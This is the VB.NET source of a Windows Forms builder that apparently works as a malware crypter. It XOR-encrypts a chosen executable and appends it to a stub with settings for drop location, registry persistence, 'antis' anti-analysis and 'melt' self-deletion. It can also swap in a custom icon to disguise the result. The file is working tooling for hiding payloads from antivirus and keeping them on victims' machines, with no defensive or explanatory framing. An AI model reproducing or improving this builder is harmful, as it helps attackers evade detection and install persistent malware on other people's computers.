﻿Imports System.IO
Imports System.Text
Public Class frmMain
    Public encryption_key As String
    Private Sub frmMain_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        encryption_key = gen_key()
    End Sub

    Private Sub btnExe_Click(sender As Object, e As EventArgs) Handles btnExe.Click
        Dim _ofd As New OpenFileDialog

        _ofd.Filter = "Executable File (*.exe)|*.exe"
        _ofd.InitialDirectory = My.Computer.FileSystem.SpecialDirectories.Desktop

        If _ofd.ShowDialog = DialogResult.OK Then
            txtExe.Text = _ofd.FileName
        End If
    End Sub

    Private Sub btnIco_Click(sender As Object, e As EventArgs) Handles btnIco.Click
        Dim _ofd As New OpenFileDialog

        _ofd.Filter = "Icon (*.ico)|*.ico"
        _ofd.InitialDirectory = My.Computer.FileSystem.SpecialDirectories.Desktop

        If _ofd.ShowDialog = DialogResult.OK Then
            txtIco.Text = _ofd.FileName
        Else
            txtIco.Text = ""
        End If
    End Sub

    Private Sub btnProtect_Click(sender As Object, e As EventArgs) Handles btnProtect.Click
        Dim _sfd As New SaveFileDialog

        _sfd.InitialDirectory = My.Computer.FileSystem.SpecialDirectories.Desktop
        _sfd.Filter = "Windows Executable (*.exe)|*.exe"
        _sfd.FileName = "stub"

        If _sfd.ShowDialog = DialogResult.OK Then
            Try
                Dim fs As String = "硼"

                Dim buffer As Byte() = My.Resources.stub

                'build stub
                My.Computer.FileSystem.WriteAllBytes(_sfd.FileName, buffer, False)

                'get random xor key
                Dim _key As Byte() = Encoding.ASCII.GetBytes(encryption_key)

                'store/encrypt payload bytes
                Dim _content As String = _encrypt()

                'INDEX 1: encrypted content
                File.AppendAllText(_sfd.FileName, fs & _content)

                'INDEX 2: xor encryption key
                File.AppendAllText(_sfd.FileName, fs & Convert.ToBase64String(_key))

                'INDEX 3: unpacked filename
                File.AppendAllText(_sfd.FileName, fs & txtName.Text)

                'INDEX 4: unpacked directory
                File.AppendAllText(_sfd.FileName, fs & comboLocation.SelectedIndex.ToString)

                'INDEX 5: optional sub-directory
                If chkFolder.Checked = True Then
                    File.AppendAllText(_sfd.FileName, fs & txtFolder.Text)
                Else
                    File.AppendAllText(_sfd.FileName, fs & "<null>")
                End If

                'INDEX 6: optional persistence
                If chkReg.Checked = True Then
                    File.AppendAllText(_sfd.FileName, fs & txtReg.Text)
                Else
                    File.AppendAllText(_sfd.FileName, fs & "<null>")
                End If

                'INDEX 7: optional antis
                If chkAnti.Checked = True Then
                    File.AppendAllText(_sfd.FileName, fs & "</>")
                Else
                    File.AppendAllText(_sfd.FileName, fs & "<null>")
                End If

                'INDEX 8: optional melt
                If chkMelt.Checked = True Then
                    File.AppendAllText(_sfd.FileName, fs & "</>")
                Else
                    File.AppendAllText(_sfd.FileName, fs & "<null>")
                End If

                'inject new icon into stub
                If Not String.IsNullOrEmpty(txtIco.Text) Then
                    IconInjector.InjectIcon(_sfd.FileName, txtIco.Text)
                End If

                MessageBox.Show("Your bytes are protected!", "Alert!")
            Catch ex As Exception
                MessageBox.Show(ex.Message, "Alert!")
            End Try
        End If
    End Sub

    Public Function gen_key() As String
        Dim rnd As New Random()
        Dim validchars() As Char = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLOMNOPQRSTUVWXYZ0123456789~`!@#$%^&*()_+-=[]{}\|':;<>,./?".ToCharArray()
        Dim junk As String = ""
        For i As Integer = 0 To rnd.Next(35, 55)
            junk += validchars(rnd.Next(0, validchars.Length))
        Next
        Return junk
    End Function

    Private Function _encrypt() As String
        Dim fileBytes As Byte() = File.ReadAllBytes(txtExe.Text)
        Dim passwordBytes As Byte() = Encoding.UTF8.GetBytes(encryption_key)
        Dim encryptedBytes As Byte() = New Byte(fileBytes.Length - 1) {}

        For i As Integer = 0 To fileBytes.Length - 1
            encryptedBytes(i) = fileBytes(i) Xor passwordBytes(i Mod passwordBytes.Length)
        Next
        Dim base64String As String = Convert.ToBase64String(encryptedBytes)

        Return base64String
    End Function
End Class
